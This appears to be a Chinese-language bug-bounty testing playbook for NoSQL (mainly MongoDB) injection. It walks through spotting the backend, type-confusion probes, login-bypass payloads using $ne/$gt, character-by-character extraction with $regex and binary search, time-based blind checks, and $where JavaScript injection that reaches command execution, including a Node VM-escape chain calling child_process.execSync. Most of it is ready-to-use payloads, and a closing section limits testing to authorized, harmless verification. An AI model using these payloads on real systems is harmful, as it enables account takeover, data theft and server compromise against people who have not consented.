# NoSQL 注入（打深篇）

> 定位：`sqli-advanced-test.md` §7「按栈选探针」里有 **NoSQL 操作符速查**（Node 栈 `{"user":{"$ne":null}}` / `{"$where":"..."}`），本篇是**专篇打深**：认后端 → 类型混淆判定 → 认证绕过 → 数据提取 → `$where` RCE。
> **前提**：只有**输入进了 NoSQL 查询**（MongoDB / CouchDB / Elasticsearch / Redis 等）才用本篇。参数是关系型 SQL 面 → 走 `sqli-advanced-test.md`；只是改个 ID 看别人数据 → 走 `idor-test.md`。
> **实战案例（双向引用）**：

> - `sqli-cases.md` §D —— **YApi 接口管理平台 MongoDB 注入**：`/api/interface/up` 的 `token` 参数，`MongoDB $regex` + **VM 逃逸 → RCE**（⚠️ 红队/防守复盘范畴，SRC 现场遇到按命令执行写，命令只做 `id`）；
> - `sqli-cases.md` §八 —— 已如实标注「缺 Redis / CouchDB 等 NoSQL 实战案例，仅 MongoDB 一例」，别指望案例索引能覆盖全；
> - `weak-password-cases.md` —— MongoDB 27017 **外网暴露即高危**（属未授权/弱口令，不是注入，别混写）；
> - `idor-cases.md` W7 —— 17 种系统服务未授权清单含 MongoDB / CouchDB；
> - `ssrf-test.md` —— `?url=http://192.168.1.1:27017/` 打内网 Mongo（SSRF 面，不是注入面）。
>
> 冲突以 `rules/src-value-hunting.md` §3 为准：按栈选探针，不封顶，但**不在无差分面上堆 payload**。

---

## 0. 先决条件：这个口后面是 NoSQL 吗

### 0.1 认后端（不用连数据库，看特征）

| 特征 | 判据 |
|---|---|
| **报错** | `MongoError` / `CastError` / `BSONError` / `unknown top level operator` / `$where` |
| **`_id` 形态** | 24 位 hex（ObjectId）`5f8d0d55b54764421b7156c3`，或 API 返回里带 `_id` 字段 |
| **技术栈** | Node + Express/Mongoose、Python + MongoEngine、PHP + mongodb 扩展、Java + Spring Data MongoDB |
| **JSON body** | 查询条件是 JSON 对象且**允许嵌套**（`{"user":{"$ne":1}}` 不报 400） |
| **PHP 特征** | 参数写成 `?user[$ne]=1` 这种**数组语法**能传进去 |
| **嵌套字段** | 返回体字段有 `$.` / 点号路径、或支持 `a.b` 嵌套查询 |
| **Elasticsearch** | `?q=` 报错含 `search_phase_execution_exception` / `QueryParsingException` |

### 0.2 值得打的口（按命中率排序）

1. **登录 / 认证**（`username` + `password` → 操作符注入直接绕过）
2. **搜索 / 筛选 / 列表查询**（条件可传对象 → `$gt` `$regex` 提数据）
3. **导出 / 报表**（筛选条件后端拼 JSON）
4. **按 ID 查询详情**（`id` 可传对象 → `{"$ne": ""}` 退化全表）
5. **密码找回 / token 校验**（`{"token":{"$ne":""}}`）
6. **聚合 / 统计接口**（`$where` `$accumulator` 老版本可 RCE）

### 0.3 一眼排除

- 参数被**强制转字符串 / 做了类型校验**（传对象直接 400 且前后无差异）→ 本枪 N/A
- 后端是 MySQL/PG（报错是 SQL 语法错）→ 走 `sqli-advanced-test.md`
- 只能改 ID 看别人数据、操作符完全无效 → 走 `idor-test.md`

---

## 1. 三步判定（从 0 到确认）

```
Step 1 · 类型混淆：把标量换成对象/数组，看后端是否接受
   ?user=admin        →  ?user[$ne]=xxx    (PHP)
   {"user":"admin"}   →  {"user":{"$ne":"xxx"}}   (JSON)
   ├─ 500 / MongoError「unknown operator」  → 操作符进了查询层 ✔ 继续
   ├─ 400 参数校验拦下                      → 走类型校验绕过(§7)；仍不行则 N/A
   └─ 完全无差异                            → 大概率不是 NoSQL，N/A

Step 2 · 操作符生效：用恒真条件看是否有差分
   {"user":{"$ne":"___not_exist___"}, "password":{"$ne":"___not_exist___"}}
   ├─ 登录成功 / 返回条数变化  → 确认 NoSQL 注入 ✔
   └─ 无变化                   → 检查字段名（可能不是 user）

Step 3 · 定利用面
   ├─ 能绕过登录         → §3
   ├─ 能改返回条数/内容  → §4 提数据
   ├─ 有 $where / JS     → §5 RCE
   └─ 什么都看不出来     → §6 时间盲注兜底，仍无差分就收手
```

---

## 2. 操作符速查表

| 操作符 | 作用 | 典型用法 |
|---|---|---|
| `$ne` | 不等于 | `{"user":{"$ne":"x"}}` —— 恒真，绕过认证 |
| `$gt` / `$gte` | 大于（**字符串按字典序比较**） | `{"pwd":{"$gt":""}}` —— 非空即真；二分提数据 |
| `$lt` / `$lte` | 小于 | 配合 `$gt` 二分 |
| `$regex` | 正则匹配 | `{"user":{"$regex":"^adm"}}` —— **逐位盲注主力** |
| `$in` / `$nin` | 在/不在数组内 | `{"user":{"$in":["admin","root"]}}` |
| `$exists` | 字段是否存在 | `{"pwd":{"$exists":true}}` |
| `$or` / `$and` | 逻辑组合 | `{"$or":[{"user":"admin"},{"user":"root"}]}` |
| `$where` | **执行 JS 表达式** | `{"$where":"this.user=='admin'"}` —— ⚠️ 可 RCE |
| `$expr` | 聚合表达式 | `{"$expr":{"$eq":["$user","admin"]}}` |
| `$not` | 取反 | `{"user":{"$not":{"$eq":"x"}}}` |
| `$type` | 按 BSON 类型 | `{"user":{"$type":2}}`（2=String） |
| `$mod` | 取模 | `{"qty":{"$mod":[2,0]}}` —— 布尔差分构造 |
| `$function` | 执行 JS 函数（Mongo ≥4.4，需开启） | ⚠️ RCE |

**关键认知**：MongoDB 的 `$gt` 对字符串是**字典序比较**，所以 `{"pwd":{"$gt":""}}` 恒真，`{"pwd":{"$gt":"a"}}` 可二分——这是提数据的数学基础。

---

## 3. 认证绕过（登录口）

### 3.1 经典 payload（按参数格式）

```text
# JSON body（Node / Python / Java 后端最常见）
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$regex":"^adm"},"password":{"$ne":"x"}}
{"username":"admin","password":{"$gt":""}}          # 已知用户名时

# PHP 数组语法（?a[$ne]= 形式）
username[$ne]=x&password[$ne]=x
username[$gt]=&password[$gt]=
username[$regex]=^admin&password[$ne]=x

# 表单（要看后端是否允许嵌套，必要时先转 JSON Content-Type）
username[$ne]=1&password[$ne]=1
```

### 3.2 换 Content-Type 是关键

很多后端**只在 `application/json` 时才把 body 解析成对象**。表单提交 `$ne` 只是普通字符串。

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":{"$ne":null},"password":{"$ne":null}}
```

> **现场第一件事**：把登录请求改成 JSON 再打。这一步能把成功率拉高一大截。

### 3.3 只拿到"登录成功"还不够

- 若登录进的是**别人账号**（`$ne` 命中第一个用户，常是管理员）→ 这是**账号接管**，危害写实；
- 若只进了**自己账号**（`$ne` 命中自己）→ 危害弱，多半只能算中危，**如实写**不要吹；
- 想指定目标：改用 `$regex` 锁定 → `{"username":{"$regex":"^admin$"},"password":{"$ne":"x"}}`。

---

## 4. 数据提取（盲注）

### 4.1 `$regex` 逐位爆破（最通用）

```text
{"username":{"$regex":"^a"}}        → 有数据 = 首字母是 a
{"username":{"$regex":"^ad"}}       → 继续
{"username":{"$regex":"^admin$"}}   → 完整命中

# 提密码（若存储明文或可逆）
{"username":"admin","password":{"$regex":"^p"}}
{"username":"admin","password":{"$regex":"^pa"}}

# 提 token / 手机号 / 身份证同理（字段换成对应的）
{"mobile":{"$regex":"^138"}}
```

> **判据是"返回条数/是否有数据"**，不是页面文字。用 Burp Intruder 或脚本跑字符集 `[a-zA-Z0-9_\-@.]`。

### 4.2 `$gt` / `$lt` 二分（比 `$regex` 快）

```text
{"username":"admin","password":{"$gt":"m"}}   → 有 = 密码首字母 > m
{"username":"admin","password":{"$gt":"p"}}   → 无 = 首字母在 m~p 之间
# 逐位二分，每字节约 7 次请求，比逐字符枚举快 3~5 倍
```

### 4.3 `$in` 批量枚举（已知候选集时）

```text
{"username":{"$in":["admin","administrator","root","test"]}}
{"role":{"$in":["admin","superadmin"]}}
```

### 4.4 提取字段是否存在 / 长度

```text
{"username":{"$regex":"^.{8}$"}}     → 长度是 8
{"password":{"$exists":true}}        → 字段存在
{"$where":"this.password.length>7"}  → 老版本可用（有 $where 时）
```

---

## 5. `$where` / JS 注入 → RCE

### 5.1 判定

```text
{"$where":"this.username=='admin'"}       → 有差分 = $where 生效
{"$where":"1==1"}                          → 返回全部
{"$where":"sleep(5000)"} / {"$where":"function(){sleep(5000)}"}  → 时间盲
```

### 5.2 RCE（MongoDB < 4.4 默认开启服务端 JS）

```javascript
{"$where":"function(){return this.username=='admin'}"}                    // 基础
{"$where":"(function(){var d=new Date();do{cd=new Date();}while(cd-d<5000);return true;})()"}  // 时间盲
// 命令执行（老版本 / 未启用 --noscripting 限制）
{"$where":"function(){var s='id';return this.username==global.process.mainModule.require('child_process').execSync(s).toString();}"}
```

### 5.3 VM 逃逸（案例：YApi）

`nodejs` 的 `vm` 沙箱在部分版本可逃逸拿到 `process`：

```javascript
{"$where":"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()"}
```

**真实案例**：`sqli-cases.md` §D —— YApi `/api/interface/up` 的 `token` 参数，`$regex` + VM 逃逸 → RCE。

> ⚠️ 该案例原文属**红队/防守复盘**范畴。SRC 现场遇到：按**命令执行**写，命令只做无害标记 / `id`，**不做免杀、不落马、不横向**（对齐 `attack-chain-cases.md` §0 与 SKILL.md 安全红线）。

---

## 6. 时间盲注（无回显兜底）

```text
{"$where":"sleep(5000) || true"}
{"$where":"(function(){var d=new Date();while(new Date()-d<5000){}})()"}
# MongoDB 4.4+ 无 $where 时，可用 $function（需服务端开启）
{"$expr":{"$function":{"body":"function(){sleep(5000);return true}","args":[],"lang":"js"}}}
```

**判据**：响应时间稳定 +5s（跑 3 次取中位数，避免网络抖动）。

---

## 7. 各语言 / 驱动的参数格式差异

| 后端 | 怎么写操作符 | 备注 |
|---|---|---|
| **PHP** | `?user[$ne]=x`（URL 数组语法）或 JSON body | PHP 的 `$_GET` 自动把 `a[b]` 变数组，**最容易中** |
| **Node + Mongoose** | JSON body `{"user":{"$ne":null}}` | Mongoose 有 schema 类型校验，严格模式会剥掉操作符（看是否 `.lean()` / 是否 cast） |
| **Python + MongoEngine/pymongo** | JSON body 或 `dict` 直接传 | pymongo 不做类型剥离，命中率高 |
| **Java + Spring Data MongoDB** | JSON body；`@Query` 里拼字符串时也可注入 | 注意参数绑定写法 |
| **Go + mgo/mongo-driver** | JSON body | 结构体绑定会剥操作符，用 `bson.M` 才会中 |
| **GraphQL** | `where: {user: {ne: "x"}}` 或参数里塞 JSON 字符串 | 见 `graphql-test.md` |

**字段类型校验绕过**：

```text
# 后端期望字符串，传对象被 400
{"user":{"$ne":null}}   → 400
# 试数组 / 换 Content-Type / 换成 POST JSON / 加 charset
{"user":[{"$ne":null}]}
# 试 $or 提升到顶层（有些校验只查叶子节点）
{"$or":[{"user":"admin"}],"password":{"$ne":null}}
```

---

## 8. 其它 NoSQL 一句话带过

| 引擎 | 注入形态 | 归属 |
|---|---|---|
| **Elasticsearch** | `?q=` 里拼 Query DSL / 老版本 `script` 字段 Groovy 执行 | 查询注入按注入写；未授权 9200 走 `middleware-unauth-test.md` |
| **Redis** | 协议注入（CRLF 注入命令）；未授权 6379 | 未授权/写公钥属 `weak-password-cases.md` + `middleware-unauth-test.md`，**不是注入** |
| **CouchDB** | `_users` 未授权、临时脚本 | 走未授权，不按注入写 |
| **Neo4j / Cypher** | 查询字符串拼接 | 形态同 SQL 注入，走 `sqli-advanced-test.md` |
| **Cassandra / CQL** | 同上 | 同上 |

---

## 9. 假点

- **传 `$ne` 直接 400** → 后端做了类型校验或用了严格 schema，**换格式（§7）不行就 N/A**，不要磨
- **返回 200 但内容无差异** → 操作符没进查询层，多半是字符串比较
- **`$gt` 返回全部** → 可能只是"非空即真"的正常业务逻辑（如搜索空条件返回全部），要**对照一个不存在的常量**做差分，别把正常行为当洞
- **时间盲 +5s 只出现一次** → 网络抖动，跑 3 次取中位数
- **Mongoose 严格 schema 剥操作符** → 打不动属预期
- **打的是 27017 端口本身** → 那是**未授权访问 / 弱口令**，不是注入，别混写（走 `weak-password-cases.md`）

---

## 10. 红线

- 命令只做**无害标记 / `id` / SRC 验证台 flag**，不读业务数据、不拖库、不留马、不横向；
- `$where` RCE 验证完**不做持久化**（对齐 `attack-chain-cases.md` §0）；
- 认证绕过**只进自己账号或测试账号**验证；若 `$ne` 命中他人账号，**到此为止、如实写报告**，不要再翻人家数据（对齐 `idor-test.md` 去伪章节）；
- 不因为能执行 JS 就做免杀 / 卸 EDR —— SRC 一律不做。

---

## 11. 自检（本篇）

- [ ] 确认后端**真是 NoSQL**（报错 / `_id` / 栈 / JSON 嵌套）？
- [ ] 试过**换 Content-Type 为 JSON** 没？
- [ ] 三步判定走完（类型混淆 → 操作符生效 → 定利用面）？
- [ ] 有**对照组**（不存在的常量）证明是真的差分？
- [ ] 登录绕过进的是谁账号？如实记录了？
- [ ] 提数据用 `$regex` / 二分，判据是"条数或是否有数据"？
- [ ] `$where` RCE 只跑了 `id`，没落马没横向？
- [ ] 打的是**注入面**还是**未授权面**（27017/9200/6379 属后者）？别混写。

---

## 12. 一句话

**认后端（报错/`_id`/JSON 嵌套）→ 换 JSON body → `{"$ne":null}` 判操作符生效 → 登录绕过用 `$ne/$gt`，提数据用 `$regex` 逐位或 `$gt` 二分 → 有 `$where` 才谈 RCE（只跑 `id`）；27017/9200/6379 那是未授权，别当注入写。**
